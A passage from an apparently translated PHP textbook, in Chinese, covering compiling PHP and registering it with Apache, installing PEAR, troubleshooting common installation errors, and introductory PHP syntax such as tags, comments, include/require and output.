> 系统中也可能缺少某些库。例如，PHP 使用 libxml2，但仅其存在还不够；你还需要 libxml2-dev 包。如果缺少某项内容，configure 工具将中止并显示（通常）有意义的错误消息（见图 2.23，该图来自已安装 libxml2 但未安装 libxml2-dev 的系统；pkg-config 包也缺失）。sqlite3 的开发包通常默认也不提供，具体名为 sqlite-devel 或 libsqlite3-dev，具体取决于发行版。如果 configure 抱怨缺少 zlib 包，则 libzlib-dev 通常有帮助。

- 5. 然后编译 PHP（见图 2.24）：

```
make
make install
```

```
checking whether to enable DTrace support... no
checking how big to make fd sets... using system default
Configuring extensions
checking io.h usability... no
checking io.h presence... no
checking for io.h... no
checking for strtol... yes
checking for atoll... yes
checking whether to build with LIBXML support... yes
checking for libxml2-2.0 >= 2.9.0... no
configure: error: in '/usr/local/src/lamp/php-8.3.2':
configure: error: The pkg-config script could not be found or is too old. Make
sure it
is in your PATH or set the PKG_CONFIG environment variable to the full
path to pkg-config.

Alternatively, you may set the environment variables LIBXML_CFLAGS
and LIBXML_LIBS to avoid the need to call pkg-config.
See the pkg-config man page for more details.

To get pkg-config, see <http://pkg-config.freedesktop.org/>.
See 'config.log' for more details.
christian@ubuntu-20: /usr/local/src/lamp/php-8.3.2$
```

图 2.23 这里仍缺少某些东西 ...

```
d/Optimizer/block_pass.o Zend/Optimizer/optimize_temp_vars_5.o Zend/Optimizer/no
p_removal.o Zend/Optimizer/compact_literals.o Zend/Optimizer/zend_cfg.o Zend/Opt
imizer/zend_dfg.o Zend/Optimizer/dfa_pass.o Zend/Optimizer/zend_ssa.o Zend/Optim
izer/zend_inference.o Zend/Optimizer/zend_func_info.o Zend/Optimizer/zend_call_g
raph.o Zend/Optimizer/sccp.o Zend/Optimizer/scdf.o Zend/Optimizer/dce.o Zend/Opt
imizer/escape_analysis.o Zend/Optimizer/compact_vars.o Zend/Optimizer/zend_dump.
o main/internal_functions_cli.o main/fastcgi.o sapi/cgi/cgi_main.o -lrt -lrt -lm
-lxml2 -lsqlite3 -lxml2 -lsqlite3 -lxml2 -lxml2 -lxml2 -lxml2 -lz -o sapi/cgi/
php-cgi
Generating phar.php
Generating phar.phar
PEAR package PHP_Archive not installed: generated phar will require PHP's phar e
xtension be enabled.
directorygraphiterator.inc
pharcommand.inc
invertedregexiterator.inc
clicommand.inc
directorytreeiterator.inc
phar.inc
Build complete.
Don't forget to run 'make test'.
christian@ubuntu-20:/usr/local/src/lamp/php-8.3.2$
```

图 2.24 "make" 准备编译（这需要一些时间）

> **注意**
> 对于 make install（见图 2.25），你通常需要管理员权限（除非你在 --prefix 中指定了当前用户有写入权限的目标目录）。例如，使用 sudo make install。

![](img/ae7820c36e8f24c1623d26668b28e80e_71_0.png)

图 2.25 "make install" 执行最终安装（比 "make" 快得多）

简要回顾：编译期间，会生成一个 Apache 模块——如果你已设置。你现在必须在 Apache 中配置此 Apache 模块。

将两个建议的 `php.ini` 文件之一复制到 `/usr/local/lib` 并重命名为 `php.ini`。或者，在配置 PHP 时，你应当指定 `--with-config-file-path=/etc/` 指令。

现在你需要在 Apache 中注册 PHP。为此，将以下行添加到 `httpd.conf` 中（在某些系统上，备选为 `apache2.conf`）：

```
AddHandler php-script .php
```

你也可以为 PHP 文件使用任何其他扩展名。只需将几个后缀依次写出即可：

```
AddHandler php-script .php8 .php
```

你还应检查模块是否已加载。为此，`httpd.conf` 中必须存在以下行：

```
LoadModule php_module modules/libphp.so
```

现在重新启动 Apache 或首次启动它——例如，使用以下命令：

```
/path/to/apachectl start
```

如果它正在运行，则必须停止并重新启动它：

```
/path/to/apachectl restart
```

请注意，PHP 配置步骤至关重要。所有重要选项都在此步骤中定义。如果你想使用新扩展，则必须重复此步骤及后续步骤。

> 注意
> 如果 PHP 在启动 Apache 时导致错误，你通常会在 Apache 错误日志中收到有意义的错误消息。

最后，使用你之前多次见过的 phpinfo() 脚本测试安装。提醒一下，这是一个简单的 PHP 文件，你将其放置在 Apache htdocs Web 目录中。它只包含三行代码（参见清单 2.1）。

```
<?php
phpinfo();
?>
```

**清单 2.1** phpinfo() (phpinfo.php)

然而，这三行作用很大。8 它们会输出完整配置字符串和扩展信息的当前 PHP 版本。因此，你可以随时查看此处安装了哪些内容。

## 刷新

在 Linux 上，你也必须保持系统更新和安全。你可以将更新交给你的发行版（见图 2.26），但这不适用于手动创建的 PHP 安装。

![](img/ae7820c36e8f24c1623d26668b28e80e_72_0.png)

**图 2.26** Ubuntu 已找到各种软件更新——包括安全关键的更新！

8 严格来说，第三行不是必须的；在 PHP 文件的末尾，?> 可以省略。

你应该在此处定期安装新版本。具体情况因发行版而异。

## 2.2 PEAR

PEAR 是 PHP 扩展库。PEAR 包含所有用 PHP 编写的扩展。其姊妹库是 PECL，其中包含用 C 编写的扩展。你可以通过 `php.ini`（Windows）或配置（Linux）集成这些用 C 编写的扩展。另一方面，PEAR 可以通过安装时附带的脚本或命令提示符安装。由于 PEAR 是官方 PHP 项目，我们想在此处总结并描述安装过程。但应当注意的是，PEAR 的进一步开发进展非常缓慢（在 PHP 8.3 下安装失败，因此后续步骤将使用 PHP 8.2），而且 Composer 及其包目录 Packagist 正在引领潮流。第 38 章将揭示更多相关内容。

### 2.2.1 安装 PEAR

在 Linux 上，PEAR 已预装（你也可以在图 2.24 中看到这一点）。但是，你可以在配置时使用 `--without-pear` 指令来阻止此行为。

在 Windows 上，你必须使用 `go-pear.phar` 文件安装 PEAR，该文件可从 `http://pear.php.net/go-pear.phar` 下载。在以下步骤中，我们假设你已将此文件保存在 `C:\php` 目录中：

- 1. 切换到命令提示符。

- 2. 在那里进入 PHP 文件夹，例如：

```
cd C:\php
```

- 3. 执行 go-pear.phar。这里的 PHAR 代表 PHP Archive，本质上是一个文件存档，其中包含开头解包的 PHP 代码：

```
php go-pear.phar
```

- 4. 你可以系统范围或本地安装 PEAR（见图 2.27；警告消息对未来 PHP 版本不太乐观）。本地是指使用相对路径——例如，用于移动硬盘传输。

- 5. 然后确认相应的安装路径。它们写入 `pear.ini` 文件。在我们的测试系统上，我们首先必须在第 13 点指定 PHP 文件夹（`C:\php`），并在第 12 点为 `pear.ini` 配置文件设置具有写入权限的存储位置。然后即可开始安装。





```
Command Prompt - php
C:\php-8.2.2\php go-pear.phar
PHP Warning:  Private methods cannot be final as they are never overridden by other classes in C:\php-8.2.2\go-pear.phar
on line 339
Warning: Private methods cannot be final as they are never overridden by other classes in C:\php-8.2.2\go-pear.phar on line 339
Are you installing a system-wide PEAR or a local copy?
(system/local) [system] :
Below is a suggested file layout for your new PEAR installation. To
change individual locations, type the number in front of the
directory. Type 'all' to change all of them at once simply press Enter to
accept these locations.
1. Installation base ($prefix)    : C:\php-8.2.2
2. Temporary directory for processing   : C:\php-8.2.2\tmp
3. Temporary directory for downloads    : C:\php-8.2.2\tmp
4. Binaries directory   : C:\php-8.2.2
5. PHP code directory ($php_dir)    : C:\php-8.2.2\pear
6. Documentation directory  : C:\php-8.2.2\docs
7. Data directory   : C:\php-8.2.2\data
8. User-modifiable configuration files directory  : C:\php-8.2.2\cfg
9. Public Web Files directory   : C:\php-8.2.2\www
10. System manual pages directory   : C:\php-8.2.2\man
11. Tests directory : C:\php-8.2.2\tests
12. Name of configuration file  : C:\WINDOWS\pear.ini
13. Path to CLI php.exe : C:\php

1-13, 'all' or Enter to continue :
```

### 图 2.27 通过控制台安装 PEAR（包含警告）

如果您希望命令提示符中的 pear 命令在 PHP 目录之外（例如 C:\php）也可用，则必须亲自更改 PATH Windows 环境变量（参见图 2.28）。

```
Command Prompt
Press Enter to continue:
** WARNING! Old version found at C:\php-8.2.2, please remove it or be sure to use the new C:\php-8.2.2\pear.bat command
The 'pear' command is now at your service at C:\php-8.2.2\pear.bat
** The 'pear' command is not currently in your PATH, so you need to
** use 'C:\php-8.2.2\pear.bat' until you have added
** 'C:\php-8.2.2' to your PATH environment variable.
Run it without parameters to see the available actions, try 'pear list'
to see what packages are installed, or 'pear help' for help.
For more information about PEAR, see:
http://pear.php.net/faq.php
http://pear.php.net/manual/
Thanks for using go-pear!
* WINDOWS ENVIRONMENT VARIABLES *
For convenience, a REG file is available under C:\php-8.2.2\PEAR_ENV.reg .
This file creates ENV variables for the current user.
Double-click this file to add it to the current user registry.
C:\php-8.2.2>
```

### 图 2.28 安装已成功完成

要安装新包，请在命令提示符/控制台中使用 pear 命令。不带选项输入该命令以查看所有可能的条目。如果您想立即试用，只需安装一个包。为此，请进入命令提示符，然后进入 PHP 目录——例如 C:\php。然后输入以下行：

```
pear install XML_SVG
```

这将安装 XML_SVG PEAR 包（参见图 2.29）。

![](img/ae7820c36e8f24c1623d26668b28e80e_75_0.png)

### 图 2.29 安装过程顺利

PEAR 命令非常强大。只需在命令提示符中键入它，不带任何参数。您将收到所有选项的列表。我们在此简要介绍其中一些：

- PEAR 安装使用所谓的频道来传递内容。安装后，使用 `pear channel-update pear.php.net` 获取当前的 PEAR 频道。通过频道，其他库也可以使用 PEAR 安装程序。

- 如果您想安装尚未具有 *Final* 状态的 PEAR 包，可以将状态指定为开关。最常见的开关是 `-alpha` 和 `-beta`。

- 使用 `--alldeps` 开关（参见图 2.30），您可以下载所有依赖包。`onlyreqdeps` 仅下载必要的包：

```
pear install --alldeps HTML_CSS
```

![](img/ae7820c36e8f24c1623d26668b28e80e_75_1.png)

### 图 2.30 还安装了依赖包，对（仍）不稳定或过时的包有一些警告

- 您还可以使用 PEAR 命令更新现有包并搜索特定包。只需在命令提示符中输入 `pear`，后跟 `upgrade package name`。要搜索，请使用 `pear search`，然后输入搜索词。

这些解释旨在特别提供一般性理解，并说明例如为什么在 Linux 安装中提到了 PEAR。但是，PEAR 对本书的其他内容不是必需的（第 32 章有一个小例外）。

> **注意**
> 曾经有过 PEAR 的第二个版本，称为 PEAR2。它依赖于一个名为 Pyrus 的新 PEAR 安装程序。然而，这方面的工作现已完全停止，主页也已关闭。

## 2.2.2 无需安装的 PEAR 包

PEAR 包是 PHP 文件，因此不一定需要安装。您也可以将相应的包直接放在 Web 服务器的某个目录中，并使用 `require_once "path/package"` 简单地包含它们。必要的步骤可以在 PEAR 手册中找到 (http://s-prs.co/v602209)。

> **注意**
> 在 http://s-prs.co/v602209，您将找到通过 Telnet/SSH 或 FTP 在主机上安装 PEAR 的技巧。但是，设置有时可能无法正常工作，具体取决于主机的安全设置。

现在您应该已经拥有一个可用的正常运行的 PHP 系统。如果没有，请查看下一章（第 3 章），您将在其中找到如何检测错误的信息。即使您的系统目前运行顺利，您也会在这里发现一些有用的提示，以防万一。

# 第 3 章

# 测试与帮助

*在理论上，一切总是如我们所设想般运作。但在实践中，情况却并不总是如理论那样。这就是为什么我们在本章中向您展示常见的错误消息——以及您可以采取的应对措施。*

您已经知道最著名的 PHP 测试：phpinfo()。在本章中，我们收集了也有助于 PHP 安装和操作的信息。第 3.1 节收集了我们在培训、项目和日常工作中遇到的一些问题，而第 3.2 节告诉您可以在互联网上哪里找到帮助。这里的重点是安装后直接出现的问题：可能出了什么问题，可能漏掉了哪些步骤？

> **注意**
> 第 35 章揭示了如何在编程本身中查找错误。

## 3.1 常见错误

常见错误列表永远不会全面，尤其是在安装的背景下。因此，如果您的错误消息或问题未在此列出，请查看第 3.2 节或在互联网上搜索。但是，我们希望在此能拦截一些常见问题。

### 3.1.1 无法显示页面

图 3.1 显示了一个典型的错误消息：某些浏览器特别“聪明”，不想用过多的技术细节吓到用户。对于某些类型的错误，浏览器会显示此处所示的消息——例如，如果找不到服务器、网线未插好、页面发生错误，或者您正值满月之夜。长话短说：此错误消息绝非信息性的。¹

¹ 当您向我们发送问题时，请记住这一点。很遗憾，凭“无法显示页面”这一信息，我们无法告诉您任何内容。

![](img/ae7820c36e8f24c1623d26668b28e80e_78_0.png)

图 3.1 无法显示页面

特别是 Chrome 浏览器团队拒绝禁用这些“精美”的消息（参见 https://bugs.chromium.org/p/chromium/issues/detail?id=1695 处的讨论）。如果有疑问，通过浏览器工具（按 F12）查看 HTTP 响应（标头和内容）会有所帮助。图 3.2 使用 Chrome 浏览器演示了这一点。

![](img/ae7820c36e8f24c1623d26668b28e80e_78_1.png)

图 3.2 浏览器控制台中的详细信息比“精美”的错误消息更有用

### 3.1.2 找不到网站——文件未找到

经典错误消息之一是 HTTP 状态码 404，意味着未找到请求的文件（参见图 3.3）。您可能在 URL 中出现了拼写错误吗？即使



文件名的大小写差异在此可能就足够了。也可能是 Web 服务器配置错误，或者你只是将文件存储在了错误的目录中。

![](img/ae7820c36e8f24c1623d26668b28e80e_79_0.png)

图 3.3 网站未找到

### 3.1.3 服务器未找到

如果 Web 浏览器报告未找到服务器或连接失败，则你的请求要么无法到达 Web 服务器，要么其响应不会被返回。如果 Web 服务器不在本地系统上，请检查路由器、防火墙或病毒扫描程序是否正在阻止连接。对于本地系统，值得查看 Web 浏览器的代理设置。

代理服务器是互联网上的一台计算机，你的所有 Web 流量都通过它运行（前提是你已设置好服务器）。但是，你不必（也无法）通过此中间机查询本地 Web 服务器。因此，请查看你的代理设置，并在必要时为本地连接关闭中间计算机。通常，操作系统的全局代理设置是一个良好的基础，但取决于浏览器，那里也有相应的选项：

- 在 Safari 中，你可以通过“首选项” • “高级” • “代理” • “更改设置”访问系统配置（参见图 3.4）。
- Firefox 用户，请转到“工具” • “设置” • “网络设置” • “设置”（参见图 3.5）。
- 在 Chrome 中，转到“设置” • “系统” • “打开计算机的代理设置”。

![](img/ae7820c36e8f24c1623d26668b28e80e_80_0.png)

图 3.4 本地地址无代理服务器

![](img/ae7820c36e8f24c1623d26668b28e80e_80_1.png)

图 3.5 部分禁用在 Firefox 中同样有效

### 3.1.4 无法初始化模块

如果在调用 CLI、错误日志中，甚至在计算机上的弹出窗口中出现消息，指出某个模块无法初始化，那么 PHP 的某个扩展存在问题。解决方案通常就在那里：例如，在图 3.6 中，你会看到一条说明模块选项不匹配的注释。这有时是由于不同的编译选项（例如，debug yes/no）造成的，但大部分是由于不同的 PHP 版本。

PHP 扩展通常适用于多个 PHP 子版本，因为 PHP 语言核心没有发生重大变化。然而，一旦发生这种情况，PHP 就会报错。当你安装了较新版本的 PHP 但未重新编译某些扩展，或在使用二进制分发版时未将新模块版本覆盖旧版本时，常会出现此错误。还应检查其他目录（例如 Windows 和系统目录），看是否存在旧版本。

![](img/ae7820c36e8f24c1623d26668b28e80e_81_0.png)

图 3.6 不正确的 API 版本表明模块已过旧

### 3.1.5 模块未找到

PHP 解释器在首次调用时可能会返回错误消息，指出模块无法加载，但你之前可能已在 php.ini 的 extensions 下注释掉或输入了该模块。此处必须按顺序检查以下事项：

- 模块或扩展是否存在于 ext 文件夹中？问题可能在于，例如，该模块仅包含在单独提供的 PECL 包中。
- php.ini 中扩展的路径是否设置正确（使用 extension_dir 指令）？

图 3.7 显示，某个扩展（顺便说一句，即用于控制 Oracle 数据库的扩展，你将在第 22 章了解到）无法找到。然而，你知道该文件确实存在。此时有两种可能性：

- PHP 解释器或 Web 服务器没有该扩展文件的访问权限。
- 扩展具有依赖项，例如其他库。

![](img/ae7820c36e8f24c1623d26668b28e80e_81_1.png)

图 3.7 无法找到（或加载）模块

在示例中，第二种情况成立：PHP 的 Oracle 库需要 Oracle 的客户端库才能正常工作。如果你使用的是 Windows，File Monitor 或其现已成熟的继任者 Process Monitor（来自 www.sysinternals.com，已被微软收购，但仍可免费使用）等程序可以为这些或其他访问问题提供非常有用的服务，因为它显示了当前正由哪些进程访问哪些文件。

图 3.8 显示该工具的输出。在每个文件旁边，你还可以看到访问是否成功（SUCCESS）或是否发生了错误（例如，FILE NOT FOUND、PERMISSION DENIED）。

![](img/ae7820c36e8f24c1623d26668b28e80e_82_0.png)

图 3.8 PHP 正在查找名为 OCI.dll 的文件，但未找到

> 提示
>
> 该工具提供过滤选项。如果输入“php”作为过滤器，则仅显示来自 PHP 进程的访问。否则，列表很快就会变得非常混乱。

### 3.1.6 浏览器打开下载窗口

如果 Web 浏览器不执行所需的 PHP 脚本并向你显示结果，而是打开一个下载窗口（参见图 3.9），那么 Web 服务器已绕过 PHP 解释器，并且正在免费向你发送脚本的源代码（如果你将结果保存到硬盘并在文本编辑器中打开，可以看到这一点）。安装过程中出了问题：请再次检查所有步骤。你可能已将 PHP 与错误的文件扩展名关联（参见第 2 章：Apache 的 httpd.conf 文件中，IIS 的管理控制台中）。

如果你在 Web 浏览器中只看到脚本的部分内容，但 PHP 代码显然未被执行，则会发生类似情况。查看 HTML 源代码。你很可能在那里也会找到你的 PHP 代码。原因：你可能不是通过测试 Web 服务器调用地址，而是本地调用的。你始终需要 http://localhost/（或计算机名或 IP 地址），因为 PHP 只有通过 Web 服务器运行时才能被解释。

![](img/ae7820c36e8f24c1623d26668b28e80e_83_0.png)

图 3.9 Web 浏览器保存了脚本

### 3.1.7 未指定输入文件（或类似内容）

你只是链接到一个不存在的文件。此错误消息（参见图 3.10）不是 Web 服务器的 404，而是 Web 服务器返回的来自 PHP 解释器的消息。

![](img/ae7820c36e8f24c1623d26668b28e80e_83_1.png)

图 3.10 phpinfo.php PHP 文件不存在

并非每个 Web 服务器在标准安装中都会这样做。但是，你也可以强制 Web 服务器检查被调用的脚本文件是否存在。在这种情况下，会显示 404 消息。

你可以在图 3.11 中看到不同的错误消息。Web 服务器报告“页面无法运行”，但你确定代码中没有出错。在错误消息的更下方，你可以看到实际原因：HTTP 错误 400——它代表“无效请求”。出现此错误的常见原因是使用 Microsoft IIS 服务器时；你可能忘记了 php.ini 中的以下指令：

```
cgi.force_redirect = 0
```

![](img/ae7820c36e8f24c1623d26668b28e80e_84_0.png)

图 3.11 HTTP 错误 400 可能表明配置不正确

### 3.1.8 调用未定义的函数

此错误消息（参见图 3.12）没有与安装帮助相关的详细信息，因为它通常隐藏了函数名中的拼写错误。然而，有时它也可能意味着你尚未安装该模块。在本书中，你始终会在“准备工作”部分找到如何安装模块的说明。

API 也可能已更改——也就是说，模块的函数名现在不同了。因此，你应始终检查当前正在使用的 PHP 版本。在线帮助提供了许多函数当前版本的信息。

![](img/ae7820c36e8f24c1623d26668b28e80e_84_1.png)

图 3.12 php_info() 不存在（但 phpinfo() 存在）

### 3.1.9 内部服务器错误

最常见的错误消息是 *内部服务器错误* 或 HTTP 错误代码 500（参见图 3.13），它表示在脚本执行过程中发生了错误，但



错误文本未传输到 Web 浏览器。这里唯一有帮助的办法是查看系统的错误日志——例如，Apache 的 error.log 文件中。

![](img/ae7820c36e8f24c1623d26668b28e80e_85_0.png)

图 3.13 不太有意义：内部服务器错误

### 3.1.10 VCRUNTIME140.DLL 缺失

Windows 下还有一个令人头疼的错误在等着你：系统报错说 vcruntime140.dll 文件缺失（见图 3.14）。的确，在 http://windows.php.net/download 的下载页面左侧（需要滚动才能看到）有一个非常小的注释，说明你需要安装 Visual Studio 2015 至 2022 版的 Visual C++ 可再发行组件。PHP 8.x 是用 Visual Studio 2019 或 2022 编译器生成的（取决于次要版本号）。如果你没有该组件，可从 Microsoft 处获取可再发行包，地址为 http://s.prs.co/v602210。

你安装的是 32 位还是 64 位版本，不取决于你使用的 Windows 版本，而取决于你安装的 PHP 版本：如果你使用的是 32 位版本的 PHP，则需要 32 位可再发行组件，即使安装的是 64 位版本的 Windows。

之前的 PHP 版本也需要安装可再发行组件。但是，在那之前，该错误似乎没有这么频繁地发生，可能是因为其他软件已经安装了可再发行组件。

![](img/ae7820c36e8f24c1623d26668b28e80e_85_1.png)

图 3.14 Windows 用户可能需要从 Microsoft 安装额外的包

### 3.1.11 浏览器中的空白页

如果 PHP 脚本在浏览器中没有产生任何输出，很可能是发生了错误，但服务器未将此错误消息传送给客户端。在这种情况下，有几种方法可以找出原因：

- 在 `php.ini` 中，使用 `display_errors = On` 以确保错误消息传送到浏览器。这只推荐在开发服务器上使用，因为详细的错误消息对"普通"用户无关紧要。
- 通过在 `php.ini` 中指定 `log_errors = On` 设置来在服务器上记录错误，然后定期检查日志文件。`error_log` 选项显示这些日志的位置。
- 你还可以在操作系统的错误日志中找到所需信息，例如，在 Windows 事件查看器中。
- 如果你无法控制代码所在的服务器，请询问你的主机提供商，如何以及是否可以访问日志文件。
- 使用浏览器开发者工具检查服务器是否发送了错误的 HTTP 状态码。

### 3.1.12 扩展未出现在 phpinfo() 中

如果扩展无法加载，浏览器中不一定会显示错误消息。之后你可以在操作系统的错误日志中找到更多信息，但通常直接在命令行中运行 PHP 更快。

图 3.15 显示了在这样一个系统上的结果：`php.ini` 加载了 Oracle 扩展，但因缺少软件要求（Oracle Instant Client，即与数据库通信的客户端库）而失败。消息 "was not found" 不完全准确，但它指出了问题所在，以及 PHP 扩展为何未出现在 `phpinfo()` 的输出中。

![](img/ae7820c36e8f24c1623d26668b28e80e_86_0.png)

图 3.15 错误消息会立即在控制台中显示

## 3.2 其他资源

PHP 有许多帮助资源。在 `php.net/support.php`，你可以找到所有可能资源的概览，包括在线手册（`php.net/manual`）和多个邮件列表（`php.net/mailing-lists.php`）。在后一个 URL 中，你甚至可以注册参加邮件列表（见图 3.16）。你将收到一封带有确认链接的确认电子邮件。之后你将被激活为邮件列表成员（这是一种垃圾邮件防护措施）。

但请记住，邮件列表依赖于所有参与者的互惠互利。遵守邮件通信中通常的礼貌规则：保持友好和客观，出现问题时始终提供精简的代码清单（而不是 100 行代码，其中只有一行出错），不要附加任何文件，且不使用 HTML 格式。这样你通常能很快找到帮助。

![](img/ae7820c36e8f24c1623d26668b28e80e_87_0.png)

图 3.16 你可以通过浏览器注册邮件列表

# 第二部分

## PHP 入门

# 第 4 章

# PHP 语言基础

本章从 PHP 语法开始，向你展示如何使用 PHP 进行编程。如果单个语法结构不清楚，本章也可作为高级读者的参考。

PHP 不难学。这个承诺出现在对该语言的全面介绍开头，将阐明语言的所有基本方面。你会发现许多小而简单的代码片段。这意味着你日后可以快速查找单个事实，并不断深入钻研 PHP。

> **提示**
> 如果你赶时间，不需要那些罕见的细节，只想快速、简洁地学习这门语言，那么在初读时可以直接跳过四级标题（那些没有编号的标题）。在那里你通常可以找到各个主题的背景信息，但只有在个别情况下才会真正重要。

## 4.1 HTML 中的 PHP

深入 PHP 的旅程始于 HTML。PHP 被设计为一种服务器端编程语言，与 HTML 紧密集成。这与其他编程语言分离代码和内容的目标形成对比。当然，在 PHP 中也可以通过在外部 PHP 文件中包含代码来实现这种分离。[^1] 但更常见的是，PHP 代码直接插入到 HTML 文件中。该文件的扩展名为 .php。[^2]

PHP 指令可以以多种方式集成到这些文件中：

```
<?php
//code
?>
```

这是包含 PHP 代码的标准方式。也允许大写：<?PHP。此外，许多现代项目（包括 Zend Framework 和 Symfony 等框架）在仅包含 PHP 代码（即不含 HTML）的文件中省略闭合的 `?>` 元素，因为这可能会错误地后跟空白字符，从而导致以 `Cannot modify header error:` 形式出现的错误消息。

```
<? //Code ?>
```

你可以通过简单地省略 `php` 并仅使用尖括号和问号来使其更短。但是，这种变体不符合 XML 规范，可以在 `php.ini` 中使用 `short_open_tag = Off` 选项关闭。这里的默认设置是 `On`，但你不应依赖此设置。因此我们不建议使用这种变体。

```
<%
//Code
%>
```

这种形式对应于 Active Server Pages (ASP)，即微软现已过时[^3]的服务器端编程技术。从 PHP 7 开始，这种变体不再存在；从这个版本起，该变体会抛出语法错误。该功能在旧版本中仍然可用。为此，你必须将 `php.ini` 配置文件[^4] 中的 `asp_tags` 条目设置为 `On`。不过，我们自然不建议使用它。

```
<script language="php">
//Code
</script>
```

这种最后一种形式在实践中一直不常见，因为它需要输入大量内容。因此，它在 PHP 7 中也被废除了。

所有类型的共同点是它们都是 PHP 语句块。你可以在 HTML 页面中插入任意数量的 PHP 块。

> **注意**
>
> 如果 PHP 页面中没有找到 PHP 语句，则 PHP 解释器会直接输出 HTML 代码。

### 4.1.1 注释

注释是源代码中不被 PHP 解释器执行的文本。在实践中，注释用于解释代码的部分内容或提供其他信息。PHP 对注释使用的语法，你可能已经从 JavaScript 或其他语言中了解：

```
// Comment
```

[^1]: 参见第 4.1.3 节
[^2]: 文件扩展名中有时也会包含版本号，例如用 PHP 5 编写的文件的 .php5。
[^3]: 被 ASP.NET 取代。那里的代码集成方式不同。
[^4]: 关于配置 PHP 的更多信息，请参见第 34 章。





这表示一行注释。// 之后的所有字符都被注释掉。

# 注释

这也表示一行注释。

```
/* Multiline
comment */
```

这会注释掉 /* 和 */ 之间的一个块，该块可能跨越多行。

> **Note**
>
> 在实践中，一种在注释开始字符旁带有两个星号的变体经常被使用：/** ... */。这些基本上是普通的 PHP 注释，但它们专门为 phpDocumentor (https://phpdoc.org) 标记。使用 phpDocumentor，您可以创建自动转换为 API 文档的注释。

> **Tip**
>
> 以有意义且易懂的方式注释您的代码。只需想想那个不得不继续在此基础工作的可怜同事，或者您自己。几年后，您将忘记脚本本来是做什么用的。无论如何，良好的注释都会让某人感到高兴！

### 4.1.2 指令

PHP 语句块中未被注释掉的所有字符共同构成 PHP 解释器执行的 PHP 代码。PHP 中包含语句的每一行都必须以分号结尾：

```php
<?php
echo "Text";
?>
```

上述语句输出一段文本，例如。

> **Note**
>
> 指令还包括术语 *expression*。在 PHP 中，所有具有值的内容都是表达式。因此，大多数语句也是表达式。然而，此定义更多是学术性的，与您的实际工作关联甚微。

### 4.1.3 外部文件

代码与内容的分离并非 PHP 的原始设计意图之一，但可以通过外部文件实现。⁵ 外部文件在其他方面也很实用，它们还允许将常用的代码片段外部化。

要包含外部文件，请使用 `include()` 和 `require()`。这两者在错误处理方面功能不同。例如，如果未找到外部文件，`include()` 仅生成警告 (`E_WARNING`)，而 `require()` 返回错误 (`E_ERROR`)。这对于错误处理以及 `php.ini` 中的错误容忍配置设置尤其重要。⁶

一个简单的示例说明了这两条语句的工作原理。外部文件包含使用 `echo` 语句的输出：

```php
<?php
echo "External PHP File!";
?>
```

清单 4.1 外部文件输出文本（“external.php”）

**Tip**

PHP 代码必须和往常一样包含在 PHP 语句块中。外部文件也可以包含 HTML 源代码。当 PHP 解释器调用外部文件时，它会读取 HTML 并解释 PHP 块（参见图 4.1）。

![](img/ae7820c36e8f24c1623d26668b28e80e_94_0.png)

图 4.1 输出外部文件的内容

5 在比较服务器端技术时，代码与内容的分离——一种模块化编程形式——是 ASP.NET 等技术很好满足的重要要求。但是，必须记住，PHP 最初之所以相对于当时的市场领导者 Perl 具有优势，恰恰是因为 PHP 代码和 HTML 代码的紧密集成。然而，得益于外部文件，现在您可以使用 PHP 进行“分离”和“集成”编程，因此在整洁编程方面没有区别。

6 您可以在第 34 章中阅读更多相关内容。在测试模式下，您应始终将 `php.ini` 中的 `error_reporting` 设置为 `E_ALL`，以便显示所有错误消息并快速识别问题。您还应该在开发和测试环境中使用 `display_errors=On` 显示错误消息。

然后使用 `include()` 将此文件包含到另一个文件中（参见清单 4.2）。

```html
<html>
<head>
<title>PHP Include</title>
</head>
<body>
<?php
include "external.php";
?>
</body>
</html>
```

清单 4.2 "include()" 包含外部文件（“include.php”）

如果文件不在同一目录中，也不在 `php.ini` 的 `include_path` 指令指定的目录中，则必须指定文件的完整路径。

> **Note**
>
> Windows 不区分文件名的大小写。在这方面，Windows 下集成外部文件的命令也不区分 `external.php` 和 `External.php`，例如。

使用 `require()` 的语法相同：

```php
require "external.php";
```

> **Note**
>
> `Statements`⁷ 是 PHP 提供的用于实现特定目标的语言结构。语句的参数写在语句后面的引号中。或者，这里也可以使用带圆括号的语法：
>
> `require("external.php");`

7 这里的命名并不清晰。PHP 中以分号结尾的一行也称为 `instruction`。它通常甚至包含一个 PHP 语言结构——即狭义上的指令（或者：命令）。但是，这些术语之间的区别更多是学术性的，没有实际影响。

### "include_once" 和 "require_once"

除了 `include()` 和 `require()` 之外，还有 `include_once()` 和 `require_once()`。这两个语言结构首先检查文件是否已被包含。如果已被包含，则不会再次包含。

如果您的脚本确实存在多次读取文件的风险，则这种行为是可取的。在这种情况下，现有的变量值或函数可能会被再次覆盖，或者函数可能会出现错误，因为函数在同一上下文中只能声明一次。

include_once() 和 require_once() 的用法与 include() 和 require() 完全相同：

```php
include_once "external.php";
require_once "external.php";
```

### 返回值

如果外部文件中的脚本使用 return 返回一个值，则该值也可以保存在变量中：

```php
$value = require("external.php");
```

### "if" 语句和循环中的特殊功能

如果 include() 或 require() 语句嵌套在 if 条件或循环等其他语句中，则该语句必须带有花括号；即，它必须是一个封闭块。简写形式：

```php
if (condition)
include "external.php";
else
include "external2.php";
```

因此不被允许，但在某些 PHP 版本中仍然有效。以下是正确的写法：

```php
if (condition) {
include "external.php";
}
else {
include "external2.php";
}
```

### 通过网络访问文件

如果您想使用绝对 URL 通过网络打开文件，则必须激活 allow_url_fopen 设置：

```
allow_url_fopen = On
```

- 8 参见第 6 章。
- 9 参见第 4.3 节。
- 10 关于此内容的更多细节见第 5 章。
- 11 另参见第 32 章。

### "include_path"

php.ini 中有一个第二个有趣的设置：在 include_path 下，您可以定义任意路径，include() 和 require() 语句会自动在这些路径中查找。在 Linux 中，多个路径用冒号分隔，在 Windows 中用分号分隔。以下是 Linux 版本：

```
include_path = ".:/php/includes"
```

以下是 Windows 版本：

```
include_path = ";c:\php\includes"
```

PATH_SEPARATOR 常数根据操作系统包含分隔符。这意味着您不需要担心这个细节，只需编写以下内容：

```
include_path = "." . PATH_SEPARATOR . "c:\php\includes"
```

您也可以更改当前脚本的 include_path 设置。有两种不同的方法：

- set_include_path() 函数：
  ```php
  set_include_path("/includes");
  ```
- ini_set() 函数用于更改 php.ini 中的任何设置：
  ```php
  ini_set("include_path", "/includes");
  ```

## 4.2 使用 PHP 进行输出

要真正开始使用 PHP，您需要能够测试语法和编程结构的工作原理。为此，您应该能够输出数据。PHP 有两个用于输出的语言结构¹²：

- echo 语句：
  ```php
  <?php
  echo "output";
  ?>
  ```
- print 语句：
  ```php
  <?php
  print "Output";
  ?>
  ```

